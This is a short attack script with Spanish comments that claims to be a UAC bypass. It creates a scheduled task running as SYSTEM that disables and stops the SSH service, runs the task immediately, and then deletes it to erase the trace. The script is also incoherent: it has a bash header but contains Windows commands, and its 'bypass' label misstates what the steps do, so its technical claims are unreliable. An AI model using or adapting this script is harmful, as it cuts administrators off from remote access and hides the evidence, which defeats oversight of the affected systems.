#!/bin/bash
echo "[*] Inyectando bypass de UAC mediante programación de hilos..."
# 1. Creamos una tarea programada con privilegios SYSTEM que se ejecuta de inmediato
schtasks /create /tn "Bypass_Purge" /tr "cmd.exe /c sc config sshd start=disabled && sc stop sshd" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM" /f
# 2. Forzamos su ejecución inmediata saltándonos el reloj del sistema
schtasks /run /tn "Bypass_Purge"
# 3. Limpiamos el rastro de la tarea inyectada
schtasks /delete /tn "Bypass_Purge" /f

